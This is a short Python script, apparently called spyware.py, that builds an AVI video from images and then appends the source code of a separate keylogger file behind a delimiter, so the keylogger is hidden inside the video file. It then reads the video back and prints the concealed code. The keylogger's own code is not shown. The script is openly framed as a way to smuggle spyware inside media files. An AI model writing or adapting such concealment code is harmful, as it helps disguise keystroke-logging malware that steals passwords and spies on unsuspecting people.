
#------Steganography is the method of hiding secret data in any image/audio/video.

# -----------------pip install pillow
#------------------install required pyxhook
# use python3 to run the script ---python3 spyware.py

import cv2
import numpy as np
import glob
import time

##Create a video with keylogger
 
img_array = []
for filename in glob.glob('./images/*.jpg'):
    img = cv2.imread(filename)
    height, width, layers = img.shape
    size = (width,height)
    img_array.append(img)
    
 
out = cv2.VideoWriter('Video_with_Keylogger.avi',cv2.VideoWriter_fourcc(*'DIVX'), 0.5, size)

for i in range(len(img_array)):
    out.write(img_array[i])
out.release()

###Appending a delimiter

variable = "****////"
with open('./Video_with_Keylogger.avi', 'a') as wfile:
   wfile.write(variable)
cap = cv2.VideoCapture('./Video_with_Keylogger.avi')

### Appending the keylogger code
f = open("Keylogger.py","r")
pgm = f.read()
with open('./Video_with_Keylogger.avi', 'a') as wfile:
   wfile.write(pgm)
cap = cv2.VideoCapture('./Video_with_Keylogger.avi')
success, frame = cap.read()
print("\n")
print("Video which has Keylogger embedded in it is created in the folder")
## 
print("\n")
print("Extracting Keylogger from video and printing on terminal...\n\n######## Code starts here ########-----Wait...")
print("\n")
time.sleep(5)
with open('./Video_with_Keylogger.avi', 'r') as wfile:
   data = wfile.read()

pos = data.find("****////")
print(data[pos+8:])






